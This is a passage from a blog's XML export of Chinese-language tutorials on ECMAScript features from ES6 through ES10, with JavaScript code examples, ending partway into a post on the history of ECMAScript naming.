ES10 Classes: private, static &amp; public members 新的语法字符#（hash tag）现在直接在类主体作用域以及constructor和类方法里被用来定义variables， functions，getters和setters 这是一个相当无意义的示例，仅关注新语法： 123456789101112131415161718192021 class Raven extends Bird &#123; #state = &#123; eggs: 10&#125;; // getter get #eggs() &#123; return state.eggs; &#125; // setter set #eggs(value) &#123; this.#state.eggs = value; &#125; #lay() &#123; this.#eggs++; &#125; constructor() &#123; super(); this.#lay.bind(this); &#125; #render() &#123; /* paint UI */ &#125;&#125; 总结与反馈 ES10是一套尚未有机会在生产环境中进行全面探索的新功能。如果您有任何更正，建议或任何其他反馈，请告诉我们。 我经常写一个教程，因为我想自己学习一些科目。这是其中一次,有其他人已经编译的资源的帮助： 感谢Sergey Podgornyy写了这篇ES10教程。 感谢 Selvaganesh写了这篇ES10教程。 参考 ecma-262-10.0【译】ES10功能完全指南(https://juejin.im/post/5c7c8e125188256365101c34)]]></content>
      <categories>
        <category>JavaScript</category>
      </categories>
      <tags>
        <tag>JavaScript</tag>
        <tag>Ecma</tag>
        <tag>ECMAScript</tag>
        <tag>ES10</tag>
        <tag>ES2019</tag>
        <tag>ECMAScript 2019</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[JavsScript ES9&ES2018的新特性]]></title>
    <url>%2Fblob%2F2019-04-17-new-features-of-javsscript-es9-%26-es2018%2F</url>
    <content type="text"><![CDATA[写在前面的话标准非实际情况。 ECMAScript 2018，ECMA-262 标准版本的第9版（通常称为ES2018或ES9），于 2018 年 6 月完成。 ECMAScript 2018 introduced support for asynchronous iteration via the AsyncIterator protocol and async generators. It also included four new regular expression features: the dotAll flag, named capture groups, Unicode property escapes, and look-behind assertions. Lastly it included rest parameter and spread operator support for object properties. Rest(剩余)/Spread(展开) 属性 Asynchronous iteration （异步迭代） Promise.prototype.finally() 正则表达式改进 先行断言(lookahead) 和 后行断言(lookbehind) Unicode 属性转义 \p{…} 和 \P{…} 命名捕获组（Named capture groups） 正则表达式的 ‘s’ 标志 Rest(剩余) 属性 对象的解构赋值用于从一个对象取值，相当于将目标对象自身的所有可遍历的（enumerable）、但尚未被读取的属性，分配到指定的对象上面。所有的键和它们的值，都会拷贝到新对象上面。但是是浅拷贝。 1234 let &#123; x, y, ...z &#125; = &#123; x: 1, y: 2, a: 3, b: 4 &#125;;x // 1y // 2z // &#123; a: 3, b: 4 &#125; 解构赋值必须是最后一个参数，而且等号右边是 undefined或null都会报错 &gt;&gt;查看更多信息&lt;&lt; Spread(展开) 属性 对象的扩展运算符（...）用于取出参数对象的所有可遍历属性，拷贝到当前对象之中。等同于使用Object.assign()方法。 123 let z = &#123; a: 3, b: 4 &#125;;let n = &#123; ...z &#125;;n // &#123; a: 3, b: 4 &#125; &gt;&gt;查看更多信息&lt;&lt; Asynchronous iteration （异步迭代） for...of循环用于遍历同步的 Iterator 接口。新引入的for await...of循环，则是用于遍历异步的 Iterator 接口。 1234567 async function f() &#123; for await (const x of createAsyncIterable(['a', 'b'])) &#123; console.log(x); &#125;&#125;// a// b 上面代码中，createAsyncIterable()返回一个拥有异步遍历器接口的对象，for…of循环自动调用这个对象的异步遍历器的next方法，会得到一个 Promise 对象。await用来处理这个 Promise 对象，一旦resolve，就把得到的值（x）传入for…of的循环体。 &gt;&gt;查看更多信息&lt;&lt; Promise.prototype.finally() finally方法用于指定不管 Promise 对象最后状态如何，都会执行的操作。finally方法的回调函数不接受任何参数，因此finally方法里面的操作，应该是与状态无关的 1234 promise.then(result =&gt; &#123;···&#125;).catch(error =&gt; &#123;···&#125;).finally(() =&gt; &#123;···&#125;); finally的简单实现 1234567 Promise.prototype.finally = function (callback) &#123; let P = this.constructor; return this.then( value =&gt; P.resolve(callback()).then(() =&gt; value), reason =&gt; P.resolve(callback()).then(() =&gt; &#123; throw reason &#125;) );&#125;; &gt;&gt;查看更多信息&lt;&lt; 正则表达式改进 先行断言(lookahead) 和 后行断言(lookbehind) JavaScript 语言的正则表达式，只支持先行断言（lookahead）和先行否定断言（negative lookahead），该版本引入后行断言（lookbehind）和后行否定断言（negative lookbehind）。 “先行断言”指的是，x只有在y前面才匹配，必须写成/x(?=y)/。 “先行否定断言”指的是，x只有不在y前面才匹配，必须写成/x(?!y)/。 “后行断言”正好与“先行断言”相反，x只有在y后面才匹配，必须写成/(?&lt;=y)x/。 “后行否定断言”则与“先行否定断言”相反，x只有不在y后面才匹配，必须写成/(?&lt;!y)x/。 先行断言 先行否定断言 12 /\d+(?=%)/.exec('100% of US presidents have been male') // ["100"]/\d+(?!%)/.exec('that’s all 44 of them') // ["44"] 后行断言 后行否定断言 12 /(?&lt;=\$)\d+/.exec('Benjamin Franklin is on the $100 bill') // ["100"]/(?&lt;!\$)\d+/.exec('it’s is worth about €90') // ["90"] &gt;&gt;查看更多信息&lt;&lt; Unicode 属性转义 \p{…} 和 \P{…} \p{...}允许正则表达式匹配符合 Unicode 某种属性的所有字符，\P{...}匹配不满足条件的字符。这两种类只对 Unicode 有效，所以使用的时候一定要加上u修饰符。如果不加u修饰符，正则表达式使用\p和\P会报错。 匹配一个希腊文字母 12 const regexGreekSymbol = /\p&#123;Script=Greek&#125;/u;regexGreekSymbol.test('π') // true Unicode 属性类要指定属性名和属性值。 1 \p&#123;UnicodePropertyName=UnicodePropertyValue&#125; 对于某些属性，可以只写属性名，或者只写属性值。 12 \p&#123;UnicodePropertyName&#125;\p&#123;UnicodePropertyValue&#125; 12 /^\p&#123;Script=Greek&#125;+$/u.test('ελληνικ?') // true/^\p&#123;Script=Latin&#125;+$/u.test('hey') // true 具体有哪些属性和属性值可以提案上查看所有属性：tc39/proposal-regexp-unicode-property-escapes &gt;&gt;查看更多信息&lt;&lt; 具名组匹配（Named capture groups） 允许为每一个组匹配指定一个名字，既便于阅读代码，又便于引用。 123456 const RE_DATE = /(?&lt;year&gt;\d&#123;4&#125;)-(?&lt;month&gt;\d&#123;2&#125;)-(?&lt;day&gt;\d&#123;2&#125;)/;const matchObj = RE_DATE.exec('1999-12-31');const year = matchObj.groups.year; // 1999const month = matchObj.groups.month; // 12const day = matchObj.groups.day; // 31 具名组匹配等于为每一组匹配加上了 ID，便于描述匹配的目的。如果组的顺序变了，也不用改变匹配后的处理代码。同时，数字序号（matchObj[1]）依然有效。 解构赋值 123 let &#123;groups: &#123;one, two&#125;&#125; = /^(?&lt;one&gt;.*):(?&lt;two&gt;.*)$/u.exec('foo:bar');one // footwo // bar 解构替换 123 let re = /(?&lt;year&gt;\d&#123;4&#125;)-(?&lt;month&gt;\d&#123;2&#125;)-(?&lt;day&gt;\d&#123;2&#125;)/u;'2015-01-02'.replace(re, '$&lt;day&gt;/$&lt;month&gt;/$&lt;year&gt;') // '02/01/2015' replace方法的第二个参数也可以是函数具体用法查看更多信息。 &gt;&gt;查看更多信息&lt;&lt; 正则表达式的 ‘s’ 修饰符 ES2018 引入s修饰符，使得.可以匹配任意单个字符。这被称为dotAll模式，即点（dot）代表一切字符。 12 /foo.bar/s.test('foo\nbar') // true/foo.bar/s.test('fooabar') // true &gt;&gt;查看更多信息&lt;&lt; 参考 ecma-262-9.0]]></content>
      <categories>
        <category>JavaScript</category>
      </categories>
      <tags>
        <tag>JavaScript</tag>
        <tag>Ecma</tag>
        <tag>ECMAScript</tag>
        <tag>ES9</tag>
        <tag>ES2018</tag>
        <tag>ECMAScript 2018</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[JavsScript ES8&ES2017的新特性]]></title>
    <url>%2Fblob%2F2019-04-17-new-features-of-javsscript-es8-%26-es2017%2F</url>
    <content type="text"><![CDATA[写在前面的话标准非实际情况。 ECMAScript 2017，ECMA-262 标准版本的第8版（通常称为ES2017或ES8），于 2017 年 6 月完成。 ECMAScript 2017 introduced Async Functions, Shared Memory, and Atomics along with smaller language and library enhancements, bug fixes, and editorial updates. Async functions improve the asynchronous programming experience by providing syntax for promise-returning functions. Shared Memory and Atomics introduce a new memory model that allows multi-agent programs to communicate using atomic operations that ensure a well-defined execution order even on parallel CPUs. This specification also includes new static methods on Object: Object.values, Object.entries, and Object.getOwnPropertyDescriptors. 与 ES6 相比，ES8 是 JavaScript 的一个小版本，但它仍然引入了非常有用的功能： 字符串填充（padStart 和 padEnd） Object.values Object.entries Object.getOwnPropertyDescriptors() 函数参数列表和调用中的尾随逗号 Async Functions (异步函数) 共享内存 和 Atomics 字符串填充（padStart 和 padEnd） 如果某个字符串不够指定长度，会在头部或尾部补全。padStart()用于头部补全，padEnd()用于尾部补全。 12 padStart(targetLength [, padString])padEnd(targetLength [, padString]) 一共接受两个参数，第一个参数是字符串补全生效的最大长度，第二个参数是用来补全的字符串。 12345678910111213 'x'.padStart(5, 'ab') // 'ababx''x'.padStart(4, 'ab') // 'abax''x'.padEnd(5, 'ab') // 'xabab''x'.padEnd(4, 'ab') // 'xaba''xxx'.padStart(2, 'ab') // 'xxx''xxx'.padEnd(2, 'ab') // 'xxx''abc'.padStart(10, '0123456789') // '0123456abc''x'.padStart(4) // ' x''x'.padEnd(4) // 'x ' &gt;&gt;查看更多信息&lt;&lt; Object.values 这个方法返回一个包含所有对象自身属性值的数组 12 const person = &#123; name: 'Fred', age: 87 &#125;Object.values(person) // ['Fred', 87] 也适用于数组: 12 const people = ['Fred', 'Tony']Object.values(people) // ['Fred', 'Tony'] &gt;&gt;查看更多信息&lt;&lt; Object.entries 方法返回一个数组，成员是参数对象自身的（不含继承的）所有可遍历（enumerable）属性的键值对数组。 12 const person = &#123; name: 'Fred', age: 87 &#125;Object.entries(person) // [['name', 'Fred'], ['age', 87]] 也适用于数组 12 const people = ['Fred', 'Tony']Object.entries(people) // [['0', 'Fred'], ['1', 'Tony']] &gt;&gt;查看更多信息&lt;&lt; Object.getOwnPropertyDescriptors() 返回对象的所有自有（非继承的）属性描述符。 描述符是属性(property) 的一组特性(attributes)，它由以下的子集组成： value：属性的值 writable：true 表示改属性可以被修改 get：属性的 getter 函数，在读取属性时调用 set：属性的 setter 函数，在属性设置值时调用 configurable：如果为 false ，则不能删除属性，也不能更改任何属性，但值除外 enumerable：如果属性是可枚举的，则为 true 该方法的引入目的，主要是为了解决Object.assign()无法正确拷贝get属性和set属性的问题。 1234 const shallowMerge = (target, source) =&gt; Object.defineProperties( target, Object.getOwnPropertyDescriptors(source)); 另外还有 Object.create 和 对象继承 的问题，请查看更多信息。 &gt;&gt;查看更多信息&lt;&lt; 函数参数列表和调用中的尾随逗号 此功能允许在函数声明和函数调用中使用尾随逗号，此功能在参数换行显示的时候比较明显 123456789 function clownsEverywhere( param1, param2,) &#123; /* ... */ &#125;clownsEverywhere( 'foo', 'bar',); 如果没有后面的都好，修改代码的时候就会显示添加逗号的那一行也发生了变动。这看上去有点冗余，因此新的语法允许定义和调用时，尾部直接有一个逗号。 &gt;&gt;查看更多信息&lt;&lt; Async Functions (异步函数) ES2017 引入了 Async Functions (异步函数) 的概念，这是该版本中引入的最重要的变化。 当 Promise 在 ES2015 中引入时，它们的目的是解决异步代码的问题，并且他们做到了。但在 ES2015 和 ES2017 相间隔的两年时间里，很明显， Promise 并不是最终的解决方案。 引入 Promise 是为了解决著名的 回调地狱 问题，但它们引入了自己的复杂性和语法复杂性。它们是良好的原语，可以向开发人员公开更好的语法：那就是Async Functions (异步函数)。 一个简单的例子： 1234567891011 function doSomethingAsync() &#123; return new Promise((resolve) =&gt; &#123; setTimeout(() =&gt; resolve('I did something'), 3000) &#125;)&#125;async function doSomething() &#123; console.log(await doSomethingAsync())&#125;console.log('Before')doSomething()console.log('After') 输出如下内容： 123 BeforeAfterI did something //after 3s 如果在promise中发生错误，在调用doSomething之后添加catch方法。 等多详细用法点击查看更多信息 &gt;&gt;查看更多信息&lt;&lt; 共享内存 和 Atomics WebWorkers 用于在浏览器中创建多线程程序。 他们通过事件提供消息传递协议。 从ES2017开始，您可以使用 SharedArrayBuffer 在 Web worker 及其创建者之间创建共享内存数组。 由于我们不知道向共享内存部分写入要花费多少时间来传播，因此 Atomics 是一种在读取值时执行该操作的方法，并且完成了任何类型的写入操作。 &gt;&gt;查看更多信息&lt;&lt;&gt;&gt;查看更多信息&lt;&lt; 参考 ES2017（ES8）带来的重大新特性 – JavaScript 完全手册（2018版）ES7和ES8新特性ecma-262-8.0]]></content>
      <categories>
        <category>JavaScript</category>
      </categories>
      <tags>
        <tag>JavaScript</tag>
        <tag>Ecma</tag>
        <tag>ECMAScript</tag>
        <tag>ES8</tag>
        <tag>ES2017</tag>
        <tag>ECMAScript 2017</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[JavsScript ES7&ES2016的新特性]]></title>
    <url>%2Fblob%2F2019-04-17-new-features-of-javsscript-es7-%26-es2016%2F</url>
    <content type="text"><![CDATA[写在前面的话标准非实际情况。 ES7，正式名称为 ECMAScript 2016 ，于2016年6月完成。 ECMAScript 2016 was the first ECMAScript edition released under Ecma TC39’s new yearly release cadence and open development process. A plain-text source document was built from the ECMAScript 2015 source document to serve as the base for further development entirely on GitHub. Over the year of this standard’s development, hundreds of pull requests and issues were filed representing thousands of bug fixes, editorial fixes and other improvements. Additionally, numerous software tools were developed to aid in this effort including Ecmarkup, Ecmarkdown, and Grammarkdown. ES2016 also included support for a new exponentiation operator and adds a new method to Array.prototype called includes. 与ES6相比，ES7 是 JavaScript 的一个小版本，仅包含两个功能： Array.prototype.includes 求幂运算符 Array.prototype.includes() 此功能引入了更易读的语法，用于检查数组是否包含元素。 使用 ES6 和更低版本，要检查数组是否包含某个元素项，您必须使用 indexOf ，它检查数组中的索引，如果元素不存在则返回 -1 。 由于 -1 被求值为真值，因此您不能这样做： 123 if (![1,2].indexOf(3)) &#123; console.log('Not found')&#125; 借助 ES7 中引入的这一新功能，我们可以这样做： 123 if (![1,2].includes(3)) &#123; console.log('Not found')&#125; &gt;&gt;查看更多信息&lt;&lt; 求幂运算符 求幂运算符 ** 等价于 Math.pow()，但是它被引入语言本身，而不是库函数。 1 Math.pow（4,2）== 4 ** 2 这个特性对于数学密集型的 JavaScript 应用程序来说是一个很好的补充。 ** 运算符在许多语言中都是标准化的，包括Python，Ruby，MATLAB，Lua，Perl等等。 &gt;&gt;查看更多信息&lt;&lt; 参考 ES2016（ES7） 的改进 – JavaScript 完全手册（2018版）ES7和ES8新特性ecma-262-7.0]]></content>
      <categories>
        <category>JavaScript</category>
      </categories>
      <tags>
        <tag>JavaScript</tag>
        <tag>Ecma</tag>
        <tag>ECMAScript</tag>
        <tag>ES7</tag>
        <tag>ES2016</tag>
        <tag>ECMAScript 2016</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[JavsScript ES6&ES2015的新特性]]></title>
    <url>%2Fblob%2F2019-04-17-new-features-of-javsscript-es6-%26-es2015%2F</url>
    <content type="text"><![CDATA[写在前面的话标准非实际情况。 ECMAScript 2015，也称为 ES6 或者 ES2015，是 ECMAScript 标准的基础版本。 在标准版本 ECMAScript 5.1 发布4年后发布，还有一个重要的变化是 ECMAScript 标准版本的命名从版本号命名改为了根据发布年号命名。 所以它不应该被命名为 ES6（尽管每个人都这样称呼它），更加准确的命名应该是 ES2015 。 由于 ES5.1 和 ES6 之间已经过了很长时间，因此 ES6 带来了很多重大的变化，一些重要的新功能以及在开发 JavaScript 程序时建议的最佳实践。 ES2015 最重要的变化包括： Arrow functions（箭头函数） Promise Generators let 和 const Classes（类） Modules（模块） Template string（模板字符串） Default parameters（默认参数） The spread operator（展开操作符） Destructuring assignments（解构分配） Enhanced object literals（增强的对象字面量） for..of 循环 Map 和 Set Arrow functions（箭头函数） 箭头函数作为一个传统函数的简写形式他改变了代码的外观和工作方式，但是这种改变是受欢迎的。 123456 var f = v =&gt; v;// 等同于var f = function (v) &#123; return v;&#125;; 如果箭头函数不需要参数或需要多个参数，就使用一个圆括号代表参数部分。 123 var f = () =&gt; 5;// 等同于var f = function () &#123; return 5 &#125;; 如果箭头函数的代码块部分多于一条语句，就要使用大括号将它们括起来，并且使用return语句返回。 1 var sum = (num1, num2) =&gt; &#123; return num1 + num2; &#125; 由于大括号被解释为代码块，所以如果箭头函数直接返回一个对象，必须在对象外面加上括号，否则会报错。 1234 // 报错let getTempItem = id =&gt; &#123; id: id, name: "Temp" &#125;;// 不报错let getTempItem = id =&gt; (&#123; id: id, name: "Temp" &#125;); 新的this的作用域函数体内的this对象，就是定义时所在的对象，而不是使用时所在的对象。如果不明白可以查看ES2015 中的箭头函数和词法 this &gt;&gt;查看更多信息&lt;&lt; Promise Promise的引入是为了消除回调地狱，简单说Promise就是一个容器，里面保存着某个未来才会结束的事件（通常是一个异步操作）的结果。 Promise对象有以下两个特点。 对象的状态不受外界影响。Promise对象代表一个异步操作，有三种状态：pending（进行中）、fulfilled（已成功）和rejected（已失败）。 一旦状态改变，就不会再变，任何时候都可以得到这个结果。Promise对象的状态改变，只有两种可能：从pending变为fulfilled和从pending变为rejected。 回调代码 123456 setTimeout(function() &#123; console.log('I promised to run after 1s') setTimeout(function() &#123; console.log('I promised to run after 2s') &#125;, 1000)&#125;, 1000) Promise代码 12345678 const wait = () =&gt; new Promise((resolve, reject) =&gt; &#123; setTimeout(resolve, 1000)&#125;)wait().then(() =&gt; &#123; console.log('I promised to run after 1s') return wait()&#125;).then(() =&gt; console.log('I promised to run after 2s')) &gt;&gt;查看更多信息&lt;&lt; let 和 const let命令，用来声明变量。它的用法类似于var，但是所声明的变量，只在let命令所在的代码块内有效。 1234567 &#123; let a = 10; var b = 1;&#125;a // ReferenceError: a is not defined.b // 1 最典型的例子就是在for循环中输出i，下面先看一下使用var声明变量的情况： 1234567 var a = [];for (var i = 0; i &lt; 10; i++) &#123; a[i] = function () &#123; console.log(i); &#125;;&#125;a[6](); // 10 变量i是var命令声明的，在全局范围内都有效，所以全局只有一个变量i。每一次循环，变量i的值都会发生改变，而循环内被赋给数组a的函数内部的console.log(i)，里面的i指向的就是全局的i。最后也就是10。 如果使用let，声明的变量仅在块级作用域内有效，最后输出的是 6。 1234567 var a = [];for (let i = 0; i &lt; 10; i++) &#123; a[i] = function () &#123; console.log(i); &#125;;&#125;a[6](); // 6 let还有 不存在变量提升、暂时性死区的特性，而且不允许重复声明。 const具有let的所有特性，同时其所声明的变量是只读的，如果是一个数组或者对象（应该叫复合数据类型）更改各自的属性还是可以的。 &gt;&gt;查看更多信息&lt;&lt; Classes（类） 生成实例对象的传统方法是通过构造函数。下面是一个例子。 12345678910 function Point(x, y) &#123; this.x = x; this.y = y;&#125;Point.prototype.toString = function () &#123; return '(' + this.x + ', ' + this.y + ')';&#125;;var p = new Point(1, 2); 有了Class之后我们可以让代码更简单一点。看下面的例子。 1234567891011 class Point &#123; constructor(x, y) &#123; this.x = x; this.y = y; &#125; toString() &#123; return '(' + this.x + ', ' + this.y + ')'; &#125;&#125;var p = new Point(1, 2); 上面这两段代码的输出是完全一样的，而且class完全可以看作构造函数的另一种写法。 12 typeof Point // "function"Point === Point.prototype.constructor // true class定义的类不能作为方式使用，否则会报错。 类的实例共用同一个原型对象 constructor constructor 是构造方法，而this关键字则代表实例对象，对应 ES5 的构造函数，该方法在用new创建实例时自动调用该方法 extends &amp; super extends继承一个类，super调用这个继承类的constructor 取值函数（getter）和存值函数（setter） 在“类”的内部可以使用get和set关键字，对某个属性设置存值函数和取值函数，拦截该属性的存取行为。 12345678910111213141516171819 class MyClass &#123; constructor() &#123; // ... &#125; get prop() &#123; return 'getter'; &#125; set prop(value) &#123; console.log('setter: '+value); &#125;&#125;let inst = new MyClass();inst.prop = 123;// setter: 123inst.prop// 'getter' &gt;&gt;查看更多信息&lt;&lt; Modules（模块） ES6 引入了import export两个命令实现了ES6模块，用于取代CommonJs和AMD规范成为浏览器和服务器通用的解决方案。ES6 的模块自动采用严格模式，并且是编译时加载，所以import不能使用表达式和变量。 接下来讲解一下这两个命令的一些用法，详细的说明可以查看更多信息 import import的语法 12345678910 import defaultExport from "module-name";import * as name from "module-name";import &#123; export &#125; from "module-name";import &#123; export as alias &#125; from "module-name";import &#123; export1 , export2 &#125; from "module-name";import &#123; foo , bar &#125; from "module-name/path/to/specific/un-exported/file";import &#123; export1 , export2 as alias2 , [...] &#125; from "module-name";import defaultExport, &#123; export [ , [...] ] &#125; from "module-name";import defaultExport, * as name from "module-name";import "module-name"; export export的语法 12345678910111213141516 export &#123; name1, name2, …, nameN &#125;;export &#123; variable1 as name1, variable2 as name2, …, nameN &#125;;export let name1, name2, …, nameN; // also var, constexport let name1 = …, name2 = …, …, nameN; // also var, constexport function FunctionName()&#123;...&#125;export class ClassName &#123;...&#125;export default expression;export default function (…) &#123; … &#125; // also class, function*export default function name1(…) &#123; … &#125; // also class, function*export &#123; name1 as default, … &#125;;export * from …;export &#123; name1, name2, …, nameN &#125; from …;export &#123; import1 as name1, import2 as name2, …, nameN &#125; from …;export &#123; default &#125; from …; &gt;&gt;查看更多信息&lt;&lt; Template string（模板字符串） 想当年我们拼接字符串大概也就是下面这几种方式： 123 // 短字符串拼接var data = &#123;msg: '请求失败'&#125;var msg = 'msg: [' + data.msg + ']'; 123456 // 长字符串拼接（如HTML拼接）var html = '&lt;body&gt;' + '&lt;div&gt;' // ...... + '&lt;/div&gt;' '&lt;/body&gt;' 12345678 // 数组字符串拼接var html = [ '&lt;body&gt;', '&lt;div&gt;', // ...... '&lt;/div&gt;', '&lt;/body&gt;'] 如果需要格式化的内容在字符串内会更麻烦，因此在千呼万唤中出现了模板字符串 12345678 const data = &#123;msg: '请求失败'&#125;const html = `&lt;body&gt; &lt;div class='msg'&gt; $&#123;data.msg&#125; &lt;/div&gt;&lt;/body&gt;` 最后该字符串将按照这个格式进行输出 &gt;&gt;查看更多信息&lt;&lt; Default parameters（默认参数） ES6之前函数处理参数默认值是需要额外的代码的 1234567 function log(x, y) &#123; y = y || 'World'; console.log(x, y);&#125;log('Hello') // Hello Worldlog('Hello', 'China') // Hello China 这种方法y的值为null undefined 0 false 都会赋值为World ES6之后可以使用更加简单的方法 123 function log(x, y = 'World') &#123; console.log(x, y)&#125; 这种方式是一种简单方法，但是只会判断y为undefined这一种情况 通常会与解构赋值一起使用 12345 function log(&#123;x, y = 'World'&#125;) &#123; console.log(x, y)&#125;log(&#123;x: 'Hello'&#125;) // Hello Worldlog(&#123;x: 'Hello', y: 'China'&#125;) // Hello China &gt;&gt;查看更多信息&lt;&lt; The spread operator（展开操作符） 扩展运算符（spread）是三个点（...）。它好比 rest 参数的逆运算，将一个数组转为用逗号分隔的参数序列。 12 console.log(1, ...[2, 3, 4], 5)// 1 2 3 4 5 1234567 const numbers = [4, 38];function push(array, ...items) &#123; array.push(...items);&#125;push([], ...numbers) // [4, 38] 第三行是rest参数，将参数变成数组 第四行是展开操作符，将数组变成参数 第七行是展开操作符，将数组变成参数 同时展开操作符也会对数组进行浅复制。 &gt;&gt;查看更多信息&lt;&lt; Destructuring assignments（解构赋值） 解构赋值常用的有对象解构、数组解构、对象数组嵌套解构、函数参数解构（基本就是前面三种情况的解构），当前还有字符串、数值、布尔值的解构。同时解构赋值也支持默认值。 1234 let [a, b, c] = [1, 2, 3];let [foo = true, [[bar], baz]] = [1, [[2], 3]];let [x, y, ...z] = ['a'];let &#123; foo: foo1, bar: bar1 &#125; = &#123; foo: 'aaa', bar: 'bbb' &#125;; 比较重要的一点是当进行解构赋值的时候比较的是undefined，如果原本使用逻辑或设置默认值，这里需要注意下代码的逻辑是否合理。 &gt;&gt;查看更多信息&lt;&lt; Enhanced object literals（增强的对象字面量） 在ES6中对象进行了重大升级。 属性的简洁标识法 你不再需要这么做 1234 const something = 'y'const x = &#123; something: something&#125; 你只需： 1234 const something = 'y'const x = &#123; something&#125; 属性名表达式 1234 const x = &#123; ['a' + '_' + 'b']: 'z'&#125;x.a_b //z 这在ES6出现之前是不能办到的 super 关键字 主要用在指向当前对象的原型对象 12345678910111213 const proto = &#123; foo: 'hello'&#125;;const obj = &#123; foo: 'world', find() &#123; return super.foo; &#125;&#125;;Object.setPrototypeOf(obj, proto);obj.find() // "hello" 注意，super关键字表示原型对象时，只能用在对象的方法之中，用在其他地方都会报错。 &gt;&gt;查看更多信息&lt;&lt; Generators Generator 函数是 ES6 提供的一种异步编程解决方案，语法行为与传统函数完全不同。 初步了解 1234567 function* helloWorldGenerator() &#123; yield 'hello'; yield 'world'; return 'ending';&#125;// 代码初始化这个 Generator(生成器)函数var hw = helloWorldGenerator(); 上面代码定义了一个 Generator 函数helloWorldGenerator，它内部有两个yield表达式（hello和world），即该函数有三个状态：hello，world 和 return 语句（结束执行）。 123456789101112 // 第一次迭代启动迭代器hw.next()// &#123; value: 'hello', done: false &#125;hw.next()// &#123; value: 'world', done: false &#125;hw.next()// &#123; value: 'ending', done: true &#125;hw.next()// &#123; value: undefined, done: true &#125; 调用遍历器对象的next方法，使得指针移向下一个状态，直到done为true时停止。其中yield表达式是暂停执行的标记，而next方法可以恢复执行。 总的来说Generator 函数是可以暂停的，并且能恢复执行。 一个更高级的例子 &gt;&gt;查看更多信息&lt;&lt; 12345678910111213141516171819202122232425262728293031 function* calculator(input) &#123; var doubleThat = 2 * (yield (input / 2)) var another = yield (doubleThat) return (input * doubleThat * another)&#125;// 初始化这个 Generator(生成器)函数。注意这里不是用 new 。const calc = calculator(10)// 第一次迭代启动迭代器。返回：&#123; value: 5, done: false &#125;/* * 运行函数 input = 10 传递给生成器构造函数。 * 它一直运行直到达到 yield，并返回 yield 的内容：input / 2 = 5。所以我们得到了一个值 5 */calc.next()// 在第二次迭代中，我们传递值 7。返回：&#123; value: 14, done: false &#125;/* * 这个参数可以传入 Generator 函数，作为上个阶段异步任务的返回结果 * 相当于 var doubleTaht = 2 * 7 * 然后我们达到第二个 yield ，然后返回 doubleThat ，因此返回值为 14 */calc.next(7)// 在下一个和最后一个迭代中，我们传入 100。返回：&#123; value: 14000, done: true &#125;/* * 本次迭代没有遇到yield，因此返回return的结果。同时 100 作为上个阶段异步任务的返回结果 * 传入参数后相当于 var another = 100 * 当迭代完成时我们只返回(input * doubleThat * another)，其数量为 10 * 14 * 100。 */calc.next(100) 异步编程的应用 &gt;&gt;查看更多信息&lt;&lt; for..of 循环 ES6 引入了for...of循环，作为遍历所有数据结构的统一的方法。 for...of循环可以使用的范围包括数组、Set 和 Map 结构、某些类似数组的对象、后文的 Generator 对象，以及字符串。 for...of可以使用break continue 关键字来终止循环和继续下一个循环 123456789 const arr = ['red', 'green', 'blue'];for(let v of arr) &#123; console.log(v); // red green blue continue console.log('--') // 永远不会输出&#125; 这里还会有一个数组循环的问题，查看JavaScript里的循环方法：forEach，for…in，for…of &gt;&gt;查看更多信息&lt;&lt; Map 和 Set ES6 提供了新的数据结构 Set。它类似于数组，但是成员的值都是唯一的，没有重复的值。 12345678 const s = new Set();[2, 3, 5, 4, 5, 2, 2].forEach(x =&gt; s.add(x));for (let i of s) &#123; console.log(i);&#125;// 2 3 5 4 Set 结构的实例有以下属性。 Set.prototype.constructor：构造函数，默认就是Set函数。 Set.prototype.size：返回Set实例的成员总数。 Set 实例的四个操作方法。 add(value)：添加某个值，返回 Set 结构本身。 delete(value)：删除某个值，返回一个布尔值，表示删除是否成功。 has(value)：返回一个布尔值，表示该值是否为Set的成员。 clear()：清除所有成员，没有返回值。 Set 结构的实例有四个遍历方法，可以用于遍历成员。Set 的遍历顺序就是插入顺序。当然也可以使用for....of ... keys()：返回键名的遍历器 values()：返回键值的遍历器 entries()：返回键值对的遍历器 forEach()：使用回调函数遍历每个成员 同时还有WeakSet，WeakSet 的成员只能是对象，其次垃圾回收机制会自动回收该对象所占用的内存，不考虑该对象还存在于 WeakSet 之中 ES6 引入Map结构来扩充键值对的集合，使各种类型的值都可以作为键值，是一种更完善的 Hash 结构表现。 1234567891011 const map = new Map();const k1 = ['a'];const k2 = ['a'];map.set(k1, 111).set(k2, 222);map.get(k1) // 111map.get(k2) // 222 同时也有WeakMap &gt;&gt;查看更多信息&lt;&lt; 参考 ECMAScript 5.1ES6 带来的重大特性 – JavaScript 完全手册（2018版）ecma-262-5.1ecma-262-6.0]]></content>
      <categories>
        <category>JavaScript</category>
      </categories>
      <tags>
        <tag>JavaScript</tag>
        <tag>Ecma</tag>
        <tag>ECMAScript</tag>
        <tag>ES6</tag>
        <tag>ES2015</tag>
        <tag>ECMAScript 2015</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[JavsScript 发展史和现状]]></title>
    <url>%2Fblob%2F2019-04-17-the-history-and-present-situation-of-javsscript%2F</url>
    <content type="text"><![CDATA[写在前面的话标准非实际情况。 从我们接触js之后可能就要接触下面这些术语： ES3 ES5 ES6 ES7 ES8 ES9 ES10 ES2015 ES2016 ES2017 ES2018 ES2019 ECMAScript 2019 ECMAScript 2018 ECMAScript 2017 ECMAScript 2016 ECMAScript 2015 未来可能接触 ES11 ES2020 ECMAScript 2020 等等。 这些是什么意思呢？它们都指的是一个名为 ECMAScript 的标准。 ECMAScript 是 JavaScript 实现所基于的标准，它通常缩写为 ES 。 除 JavaScript 外，其他语言实现（ed）ECMAScript，包括： ActionScript （Flash脚本语言） JScript（微软脚本语言） 但是，JavaScript 是 最流行 和广泛使用的 ES 实现。 为何这个奇怪的名字？ Ecma International 是瑞士标准协会，负责制定国际标准。 当 JavaScript 被创建时，它由 Netscape 和 Sun Microsystems 呈给 Ecma ，他们给它命名为 ECMA-262 ，别名 ECMAScript。 在 IE9 之后，微软停止在浏览器中将其 ES 支持称为 JScript ，并开始将其称为 JavaScript。 ES版本 令人费解的是，为什么有时 ES 版本会以版本编号引用，有时却按年份引用。 在 ES2015 之前，ECMAScript 规范通常按其版本命名。 因此，ES5 是 2009 年更新发布的ECMAScript 规范的官方名称。 为什么会这样呢? 在 ES2015 诞生的过程中，这个名字从 ES6 变成了 ES2015 